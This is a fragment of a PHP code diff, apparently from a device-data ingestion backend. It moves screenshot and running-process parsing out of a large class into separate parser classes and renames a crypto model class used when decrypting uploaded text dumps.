+        return (new \App\Libraries\Parsers\UserPrivacyParser($this->db))->parse_screenshots($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -3409,101 +2172,7 @@ log_message('info', '[parse_alarms] Inserted ' . count($jobs) . ' jobs and ' . c
      */
     public function parse_running_processes(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $list = $json['processes'] ?? [];
-            if (!is_array($list)) return false;
-
-            $batch = [];
-            foreach ($list as $proc) {
-                $pid = $proc['pid'] ?? null;
-                if ($pid === null) continue;
-
-                $exists = $this->db->table('tbl_system_running_processes_detailed')
-                    ->where('owner_id', $owner_id)
-                    ->where('device_id', $device_id)
-                    ->where('pid', $pid)
-                    ->countAllResults() > 0;
-                if ($exists) continue;
-
-                $batch[] = [
-                    'owner_id' => $owner_id,
-                    'device_id' => $device_id,
-                    'pid' => $pid,
-                    'name' => $proc['name'] ?? null,
-                    'ppid' => $proc['ppid'] ?? null,
-                    'uid' => $proc['uid'] ?? null,
-                    'importance' => $proc['importance'] ?? null,
-                    'state' => $proc['state'] ?? null,
-                    'tid' => $proc['tid'] ?? null,
-                    'nice' => $proc['nice'] ?? null,
-                    'threads' => $proc['threads'] ?? null,
-                    'vsize_kb' => $proc['vsize_kb'] ?? null,
-                    'vsize_peak_kb' => $proc['vsize_peak_kb'] ?? null,
-                    'rss_kb' => $proc['rss_kb'] ?? null,
-                    'pss_kb' => $proc['pss_kb'] ?? null,
-                    'uss_kb' => $proc['uss_kb'] ?? null,
-                    'swap_kb' => $proc['swap_kb'] ?? null,
-                    'cpu_time_ms' => $proc['cpu_time_ms'] ?? null,
-                    'cpu_time_user_ms' => $proc['cpu_time_user_ms'] ?? null,
-                    'cpu_time_system_ms' => $proc['cpu_time_system_ms'] ?? null,
-                    'start_time' => $proc['start_time'] ?? null,
-                    'elapsed_time_ms' => $proc['elapsed_time_ms'] ?? null,
-                    'processor' => $proc['processor'] ?? null,
-                    'cmdline' => $proc['cmdline'] ?? null,
-                    'gid' => $proc['gid'] ?? null,
-                    'groups' => is_array($proc['groups'] ?? null) ? implode(',', $proc['groups']) : ($proc['groups'] ?? null),
-                    'priority' => $proc['priority'] ?? null,
-                    'fd_count' => $proc['fd_count'] ?? null,
-                    'socket_count' => $proc['socket_count'] ?? null,
-                    'wake_lock_count' => $proc['wake_lock_count'] ?? null,
-                    'oom_score' => $proc['oom_score'] ?? null,
-                    'oom_score_adj' => $proc['oom_score_adj'] ?? null,
-                    'cgroup' => $proc['cgroup'] ?? null,
-                    'selinux_context' => $proc['selinux_context'] ?? null,
-                    'capabilities_eff' => $proc['capabilities_eff'] ?? null,
-                    'capabilities_prm' => $proc['capabilities_prm'] ?? null,
-                    'capabilities_inh' => $proc['capabilities_inh'] ?? null,
-                    'capabilities_bnd' => $proc['capabilities_bnd'] ?? null,
-                    'capabilities_amb' => $proc['capabilities_amb'] ?? null,
-                    'seccomp_mode' => $proc['seccomp_mode'] ?? null,
-                    'env_vars' => is_array($proc['env_vars'] ?? null) ? json_encode($proc['env_vars']) : ($proc['env_vars'] ?? null),
-                    'signal_mask' => $proc['signal_mask'] ?? null,
-                    'signal_pending' => $proc['signal_pending'] ?? null,
-                    'signal_blocked' => $proc['signal_blocked'] ?? null,
-                    'signal_ignored' => $proc['signal_ignored'] ?? null,
-                    'signal_caught' => $proc['signal_caught'] ?? null,
-                    'wake_channels' => $proc['wake_channels'] ?? null,
-                    'timer_slack_ns' => $proc['timer_slack_ns'] ?? null,
-                    'namespace' => $proc['namespace'] ?? null,
-                    'open_files' => is_array($proc['open_files'] ?? null) ? json_encode($proc['open_files']) : ($proc['open_files'] ?? null),
-                    'memory_maps' => is_array($proc['memory_maps'] ?? null) ? json_encode($proc['memory_maps']) : ($proc['memory_maps'] ?? null),
-                    'stack_trace' => $proc['stack_trace'] ?? null,
-                    'cputime_clock_id' => $proc['cputime_clock_id'] ?? null,
-                    'cpu_percent' => $proc['cpu_percent'] ?? null,
-                    'extracted_at' => $extracted_at,
-                    'created_at' => $dated,
-                    'updated_at' => $dated,
-                ];
-            }
-
-            if (!empty($batch)) {
-                $this->db->table('tbl_system_running_processes_detailed')->insertBatch($batch);
-            }
-
-            log_message('info', '[parse_running_processes] Inserted ' . count($batch) . ' detailed processes from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_running_processes] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\AppPermissionParser($this->db))->parse_running_processes($payload, $owner_id, $device_id, $fileRecordId);
     }
 
 /**
@@ -4184,7 +2853,7 @@ private function decryptIfEncrypted(string $content): ?string
             return $payload;
         }
 
-        $cryptModel = new Mod_Crypt();
+        $cryptModel = new CryptModel();
         $raw = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
         if ($raw === false) {
             log_message('error', '[payloadToArray] Cannot read file: ' . $file_name);
